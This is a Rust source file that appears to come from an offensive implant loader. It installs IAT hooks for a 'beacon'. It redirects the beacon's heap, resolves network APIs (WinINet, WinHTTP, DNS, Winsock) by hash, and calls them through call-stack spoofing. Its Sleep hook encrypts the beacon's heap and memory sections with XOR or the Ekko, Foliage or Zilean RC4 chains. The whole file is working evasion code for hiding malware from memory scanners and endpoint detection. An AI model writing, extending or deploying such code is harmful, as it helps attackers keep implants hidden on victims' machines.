//! IAT hooks for beacon API interception.
//!
//! All hooks access the persisted `Api` via `(*StubAddr() as PSTUB).api`.
//! Hooks for ntdll/kernel32/kernelbase/advapi32 use auto-spoofing wrapper
//! methods. Hooks for external modules (wininet, winhttp, dnsapi, ws2_32)
//! resolve functions by hash and call via `spoof_uwd!` with the kernelbase
//! spoof config.
//!
//! Sleep_Hook copies Api to the stack because the beacon heap (where Api
//! lives) gets encrypted during sleep obfuscation.

#[cfg(feature = "sleep-xor")]
use hypnus::common::xor_heap;
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
use hypnus::common::{encrypt_heap_rc4, generate_encryption_key};
#[cfg(feature = "sleep-ekko")]
use hypnus::ekko;
#[cfg(feature = "sleep-foliage")]
use hypnus::foliage;
#[cfg(feature = "sleep-xor")]
use hypnus::xor;
#[cfg(feature = "sleep-zilean")]
use hypnus::zilean;
use {
    crate::{StubAddr, PSTUB},
    api::{api::Api, dbg_print, hash_str, util::get_loaded_module_by_hash, windows::*},
    core::{ffi::c_void, mem::transmute},
};
// =============================================================================
// Heap hooks - redirect allocations to the isolated beacon heap
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn GetProcessHeap_Hook() -> HANDLE {
    let stub_ptr = StubAddr() as PSTUB;
    (*stub_ptr).beacon_heap_handle
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn RtlAllocateHeap_Hook(
    heap_handle: PVOID,
    flags: ULONG,
    size: SIZE_T,
) -> PVOID {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.RtlAllocateHeap(heap_handle, flags, size)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn HeapAlloc_Hook(
    h_heap: HANDLE,
    dw_flags: DWORD,
    dw_bytes: SIZE_T,
) -> LPVOID {
    RtlAllocateHeap_Hook(h_heap, dw_flags, dw_bytes)
}

// =============================================================================
// WinINet hooks - external module, resolve by hash + spoof_uwd!
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn InternetOpenA_Hook(
    lpsz_agent: LPCSTR,
    dw_access_type: DWORD,
    lpsz_proxy: LPCSTR,
    lpsz_proxy_bypass: LPCSTR,
    dw_flags: DWORD,
) -> HINTERNET {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnInternetOpenA = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("InternetOpenA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            lpsz_agent,
            dw_access_type as usize,
            lpsz_proxy,
            lpsz_proxy_bypass,
            dw_flags as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        lpsz_agent,
        dw_access_type,
        lpsz_proxy,
        lpsz_proxy_bypass,
        dw_flags,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn InternetConnectA_Hook(
    h_internet: HINTERNET,
    lpsz_server_name: LPCSTR,
    n_server_port: INTERNET_PORT,
    lpsz_user_name: LPCSTR,
    lpsz_password: LPCSTR,
    dw_service: DWORD,
    dw_flags: DWORD,
    dw_context: DWORD_PTR,
) -> HINTERNET {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnInternetConnectA = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("InternetConnectA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_internet,
            lpsz_server_name,
            n_server_port as usize,
            lpsz_user_name,
            lpsz_password,
            dw_service as usize,
            dw_flags as usize,
            dw_context as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_internet,
        lpsz_server_name,
        n_server_port,
        lpsz_user_name,
        lpsz_password,
        dw_service,
        dw_flags,
        dw_context,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn HttpOpenRequestA_Hook(
    h_connect: HINTERNET,
    lpsz_verb: LPCSTR,
    lpsz_object_name: LPCSTR,
    lpsz_version: LPCSTR,
    lpsz_referrer: LPCSTR,
    lplpsz_accept_types: *const LPCSTR,
    dw_flags: DWORD,
    dw_context: DWORD_PTR,
) -> HINTERNET {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnHttpOpenRequestA = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("HttpOpenRequestA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_connect,
            lpsz_verb,
            lpsz_object_name,
            lpsz_version,
            lpsz_referrer,
            lplpsz_accept_types,
            dw_flags as usize,
            dw_context as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_connect,
        lpsz_verb,
        lpsz_object_name,
        lpsz_version,
        lpsz_referrer,
        lplpsz_accept_types,
        dw_flags,
        dw_context,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn HttpSendRequestA_Hook(
    h_request: HINTERNET,
    lpsz_headers: LPCSTR,
    dw_headers_length: DWORD,
    lp_optional: LPVOID,
    dw_optional_length: DWORD,
) -> BOOL {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnHttpSendRequestA = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("HttpSendRequestA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            lpsz_headers,
            dw_headers_length as usize,
            lp_optional,
            dw_optional_length as usize
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_request,
        lpsz_headers,
        dw_headers_length,
        lp_optional,
        dw_optional_length,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn HttpQueryInfoA_Hook(
    h_request: HINTERNET,
    dw_info_level: DWORD,
    lp_buffer: LPVOID,
    lpdw_buffer_length: LPDWORD,
    lpdw_index: LPDWORD,
) -> BOOL {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnHttpQueryInfoA = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("HttpQueryInfoA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            dw_info_level as usize,
            lp_buffer,
            lpdw_buffer_length,
            lpdw_index
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_request,
        dw_info_level,
        lp_buffer,
        lpdw_buffer_length,
        lpdw_index,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn InternetReadFile_Hook(
    h_file: HINTERNET,
    lp_buffer: LPVOID,
    dw_number_of_bytes_to_read: DWORD,
    lpdw_number_of_bytes_read: LPDWORD,
) -> BOOL {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnInternetReadFile = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("InternetReadFile") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_file,
            lp_buffer,
            dw_number_of_bytes_to_read as usize,
            lpdw_number_of_bytes_read
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_file,
        lp_buffer,
        dw_number_of_bytes_to_read,
        lpdw_number_of_bytes_read,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn InternetQueryDataAvailable_Hook(
    h_file: HINTERNET,
    lpdw_number_of_bytes_available: LPDWORD,
    dw_flags: DWORD,
    dw_context: DWORD_PTR,
) -> BOOL {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnInternetQueryDataAvailable = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("InternetQueryDataAvailable") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_file,
            lpdw_number_of_bytes_available,
            dw_flags as usize,
            dw_context as usize
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_file, lpdw_number_of_bytes_available, dw_flags, dw_context)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn InternetCloseHandle_Hook(h_internet: HINTERNET) -> BOOL {
    let wininet_base = get_loaded_module_by_hash(hash_str!("wininet.dll"));
    let f: FnInternetCloseHandle = transmute(api::util::api::<()>(
        wininet_base,
        hash_str!("InternetCloseHandle") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(&mut api.ntdll.spoof_config, f as *const c_void, h_internet)
            as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_internet)
}

// =============================================================================
// WinHTTP hooks - external module, resolve by hash + spoof_uwd!
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpOpen_Hook(
    pszAgentW: LPCWSTR,
    dw_access_type: DWORD,
    pszProxyW: LPCWSTR,
    pszProxyBypassW: LPCWSTR,
    dw_flags: DWORD,
) -> HINTERNET {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpOpen = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpOpen") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            pszAgentW,
            dw_access_type as usize,
            pszProxyW,
            pszProxyBypassW,
            dw_flags as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        pszAgentW,
        dw_access_type,
        pszProxyW,
        pszProxyBypassW,
        dw_flags,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpConnect_Hook(
    h_session: HINTERNET,
    pswz_server_name: LPCWSTR,
    n_server_port: u16,
    dw_reserved: DWORD,
) -> HINTERNET {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpConnect = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpConnect") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_session,
            pswz_server_name,
            n_server_port as usize,
            dw_reserved as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_session, pswz_server_name, n_server_port, dw_reserved)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpOpenRequest_Hook(
    h_connect: HINTERNET,
    pwsz_verb: LPCWSTR,
    pwsz_object_name: LPCWSTR,
    pwsz_version: LPCWSTR,
    pwsz_referrer: LPCWSTR,
    ppwsz_accept_types: *const LPCWSTR,
    dw_flags: DWORD,
) -> HINTERNET {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpOpenRequest = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpOpenRequest") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_connect,
            pwsz_verb,
            pwsz_object_name,
            pwsz_version,
            pwsz_referrer,
            ppwsz_accept_types,
            dw_flags as usize
        ) as HINTERNET;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_connect,
        pwsz_verb,
        pwsz_object_name,
        pwsz_version,
        pwsz_referrer,
        ppwsz_accept_types,
        dw_flags,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpSendRequest_Hook(
    h_request: HINTERNET,
    lpsz_headers: LPCWSTR,
    dw_headers_length: DWORD,
    lp_optional: LPVOID,
    dw_optional_length: DWORD,
    dw_total_length: DWORD,
    dw_context: DWORD_PTR,
) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpSendRequest = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpSendRequest") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            lpsz_headers,
            dw_headers_length as usize,
            lp_optional,
            dw_optional_length as usize,
            dw_total_length as usize,
            dw_context as usize
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_request,
        lpsz_headers,
        dw_headers_length,
        lp_optional,
        dw_optional_length,
        dw_total_length,
        dw_context,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpReceiveResponse_Hook(
    h_request: HINTERNET,
    lp_reserved: LPVOID,
) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpReceiveResponse = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpReceiveResponse") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            lp_reserved
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_request, lp_reserved)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpQueryHeaders_Hook(
    h_request: HINTERNET,
    dw_info_level: DWORD,
    pwsz_name: LPCWSTR,
    lp_buffer: LPVOID,
    lpdw_buffer_length: LPDWORD,
    lpdw_index: LPDWORD,
) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpQueryHeaders = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpQueryHeaders") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            dw_info_level as usize,
            pwsz_name,
            lp_buffer,
            lpdw_buffer_length,
            lpdw_index
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_request,
        dw_info_level,
        pwsz_name,
        lp_buffer,
        lpdw_buffer_length,
        lpdw_index,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpReadData_Hook(
    h_request: HINTERNET,
    lp_buffer: LPVOID,
    dw_number_of_bytes_to_read: DWORD,
    lpdw_number_of_bytes_read: LPDWORD,
) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpReadData = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpReadData") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            lp_buffer,
            dw_number_of_bytes_to_read as usize,
            lpdw_number_of_bytes_read
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        h_request,
        lp_buffer,
        dw_number_of_bytes_to_read,
        lpdw_number_of_bytes_read,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpQueryDataAvailable_Hook(
    h_request: HINTERNET,
    lpdw_number_of_bytes_available: LPDWORD,
) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpQueryDataAvailable = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpQueryDataAvailable") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            h_request,
            lpdw_number_of_bytes_available
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_request, lpdw_number_of_bytes_available)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WinHttpCloseHandle_Hook(h_internet: HINTERNET) -> BOOL {
    let winhttp_base = get_loaded_module_by_hash(hash_str!("winhttp.dll"));
    let f: FnWinHttpCloseHandle = transmute(api::util::api::<()>(
        winhttp_base,
        hash_str!("WinHttpCloseHandle") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(&mut api.ntdll.spoof_config, f as *const c_void, h_internet)
            as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(h_internet)
}

// =============================================================================
// DNS hooks - external module, resolve by hash + spoof_uwd!
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn DnsExtractRecordsFromMessage_UTF8_Hook(
    p_dns_buffer: PVOID,
    w_message_length: WORD,
    pp_record: *mut PVOID,
) -> i32 {
    let dnsapi_base = get_loaded_module_by_hash(hash_str!("dnsapi.dll"));
    let f: FnDnsExtractRecordsFromMessage_UTF8 = transmute(api::util::api::<()>(
        dnsapi_base,
        hash_str!("DnsExtractRecordsFromMessage_UTF8") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            p_dns_buffer,
            w_message_length as usize,
            pp_record
        ) as i32;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(p_dns_buffer, w_message_length, pp_record)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn DnsWriteQuestionToBuffer_UTF8_Hook(
    p_dns_buffer: PVOID,
    pdw_buffer_size: LPDWORD,
    lpstr_name: LPCSTR,
    w_type: WORD,
    xid: WORD,
    f_recursion_desired: BOOL,
) -> BOOL {
    let dnsapi_base = get_loaded_module_by_hash(hash_str!("dnsapi.dll"));
    let f: FnDnsWriteQuestionToBuffer_UTF8 = transmute(api::util::api::<()>(
        dnsapi_base,
        hash_str!("DnsWriteQuestionToBuffer_UTF8") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            p_dns_buffer,
            pdw_buffer_size,
            lpstr_name,
            w_type as usize,
            xid as usize,
            f_recursion_desired as usize
        ) as BOOL;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(
        p_dns_buffer,
        pdw_buffer_size,
        lpstr_name,
        w_type,
        xid,
        f_recursion_desired,
    )
}

// =============================================================================
// Winsock hook - external module, resolve by hash + spoof_uwd!
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn WSASocketA_Hook(
    af: i32,
    socket_type: i32,
    protocol: i32,
    lp_protocol_info: LPVOID,
    g: u32,
    dw_flags: DWORD,
) -> usize {
    let ws2_32_base = get_loaded_module_by_hash(hash_str!("ws2_32.dll"));
    let f: FnWSASocketA = transmute(api::util::api::<()>(
        ws2_32_base,
        hash_str!("WSASocketA") as usize,
    ));

    #[cfg(feature = "spoof-uwd")]
    {
        let api = &mut *(*(StubAddr() as PSTUB)).api;
        return crate::spoof_uwd!(
            &mut api.ntdll.spoof_config,
            f as *const c_void,
            af as usize,
            socket_type as usize,
            protocol as usize,
            lp_protocol_info,
            g as usize,
            dw_flags as usize
        ) as usize;
    }
    #[cfg(not(feature = "spoof-uwd"))]
    f(af, socket_type, protocol, lp_protocol_info, g, dw_flags)
}

// =============================================================================
// Wait hooks - use persisted Api wrappers
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn NtWaitForSingleObject_Hook(
    handle: HANDLE,
    alertable: BOOLEAN,
    timeout: PLARGE_INTEGER,
) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.NtWaitForSingleObject(handle, alertable, timeout)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WaitForSingleObject_Hook(
    h_handle: HANDLE,
    dw_milliseconds: DWORD,
) -> DWORD {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.kernel32.WaitForSingleObject(h_handle, dw_milliseconds)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn WaitForSingleObjectEx_Hook(
    h_handle: HANDLE,
    dw_milliseconds: DWORD,
    b_alertable: BOOL,
) -> DWORD {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.kernel32
        .WaitForSingleObjectEx(h_handle, dw_milliseconds, b_alertable)
}

// =============================================================================
// Memory / thread hooks - use persisted Api wrappers
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn NtProtectVirtualMemory_Hook(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: PSIZE_T,
    new_protect: ULONG,
    old_protect: PULONG,
) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.NtProtectVirtualMemory(
        process_handle,
        base_address,
        region_size,
        new_protect,
        old_protect,
    )
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn SystemFunction032_Hook(data: PUSTRING, key: PUSTRING) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.advapi.SystemFunction032(data, key)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn NtGetContextThread_Hook(
    thread_handle: HANDLE,
    thread_context: PCONTEXT,
) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.NtGetContextThread(thread_handle, thread_context)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn NtSetContextThread_Hook(
    thread_handle: HANDLE,
    thread_context: PCONTEXT,
) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.NtSetContextThread(thread_handle, thread_context)
}

#[link_section = ".text$D"]
pub unsafe extern "C" fn NtContinue_Hook(
    context_record: PCONTEXT,
    test_alert: BOOLEAN,
) -> NTSTATUS {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.NtContinue(context_record, test_alert)
}

// =============================================================================
// Sleep hook - copies Api to stack (heap gets encrypted during sleep)
// =============================================================================

#[link_section = ".text$D"]
pub unsafe extern "C" fn Sleep_Hook(dw_milliseconds: DWORD) {
    let stub_ptr = StubAddr() as PSTUB;

    // Copy Api to stack - the beacon heap (where Api lives) gets encrypted
    // during sleep obfuscation, so we need a local copy that survives.
    let mut api: Api = core::ptr::read((*stub_ptr).api);

    dbg_print!(api, b"[HOOK:Sleep] ms: %d\n\0", dw_milliseconds);

    // Set up sleep context from STUB fields
    api.sleep.cfg = 0;
    api.sleep.dw_milliseconds = dw_milliseconds;
    api.sleep.buffer = (*stub_ptr).stub_beacon_address as _;
    api.sleep.length = (*stub_ptr).stub_beacon_size as _;
    api.sleep.stub_size = (*stub_ptr).stub_size as _;
    api.sleep.heap = (*stub_ptr).beacon_heap_handle;
    api.sleep.num_sections =
        core::ptr::read_unaligned(core::ptr::addr_of!((*stub_ptr).num_sections)) as usize;

    for i in 0..api.sleep.num_sections.min(20) {
        api.sleep.sections[i] =
            core::ptr::read_unaligned(core::ptr::addr_of!((*stub_ptr).sections[i]));
    }

    #[cfg(feature = "sleep-xor")]
    {
        if dw_milliseconds >= 1000 {
            dbg_print!(api, b"[HOOK:Sleep] XOR heap + sections\n\0");
            xor_heap(&mut api);
            xor::mask_memory_from_context(&mut api, true);
        }

        // Resolve real Sleep from kernel32 (can't use api.kernel32.Sleep
        // because the wrapper spoofs, and we want the raw call here)
        let kernel32_base = get_loaded_module_by_hash(hash_str!("kernel32.dll"));
        let sleep_fn: FnSleep = transmute(api::util::api::<()>(
            kernel32_base,
            hash_str!("Sleep") as usize,
        ));

        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(
                &mut api.kernel32.spoof_config,
                sleep_fn as *const c_void,
                dw_milliseconds as usize
            );
        }
        #[cfg(not(feature = "spoof-uwd"))]
        sleep_fn(dw_milliseconds);

        if dw_milliseconds >= 1000 {
            dbg_print!(api, b"[HOOK:Sleep] Restore sections + heap\n\0");
            xor::mask_memory_from_context(&mut api, false);
            xor_heap(&mut api);
        }
    }

    #[cfg(feature = "sleep-ekko")]
    {
        if dw_milliseconds < 1000 {
            api.kernel32.WaitForSingleObjectEx(
                -1isize as _,
                dw_milliseconds,
                crate::windows::FALSE,
            );
            api.zero();
            return;
        }

        generate_encryption_key(&mut api);
        encrypt_heap_rc4(&mut api);
        ekko::ekko_with_fiber(&mut api);
        // The chain flips the entire buffer to RX - update tracking to match
        // reality, then restore per-section permissions so .data/.rdata get
        // their original protections back before any writes.
        api::util::mark_sections_protect(&mut api, PAGE_EXECUTE_READ);
        api::util::restore_section_protections(&mut api);
        encrypt_heap_rc4(&mut api);
    }
    #[cfg(feature = "sleep-foliage")]
    {
        if dw_milliseconds < 1000 {
            api.kernel32.WaitForSingleObjectEx(
                -1isize as _,
                dw_milliseconds,
                crate::windows::FALSE,
            );
            api.zero();
            return;
        }

        generate_encryption_key(&mut api);
        encrypt_heap_rc4(&mut api);
        foliage::foliage_with_fiber(&mut api);
        // The chain flips the entire buffer to RX - update tracking to match
        // reality, then restore per-section permissions so .data/.rdata get
        // their original protections back before any writes.
        api::util::mark_sections_protect(&mut api, PAGE_EXECUTE_READ);
        api::util::restore_section_protections(&mut api);
        encrypt_heap_rc4(&mut api);
    }
    #[cfg(feature = "sleep-zilean")]
    {
        generate_encryption_key(&mut api);
        encrypt_heap_rc4(&mut api);
        zilean::zilean_with_fiber(&mut api);
        // The chain flips the entire buffer to RX - update tracking to match
        // reality, then restore per-section permissions so .data/.rdata get
        // their original protections back before any writes.
        api::util::mark_sections_protect(&mut api, PAGE_EXECUTE_READ);
        api::util::restore_section_protections(&mut api);
        encrypt_heap_rc4(&mut api);
    }

    // Zero the stack copy of Api (sensitive data)
    api.zero();
}

// =============================================================================
// Thread exit hook (not yet enabled - needs cleanup logic)
// =============================================================================

#[link_section = ".text$D"]
#[allow(dead_code)]
pub unsafe extern "C" fn ExitThread_Hook(dw_exit_code: DWORD) {
    let api = &mut *(*(StubAddr() as PSTUB)).api;
    api.ntdll.RtlExitUserThread(dw_exit_code as NTSTATUS);
}
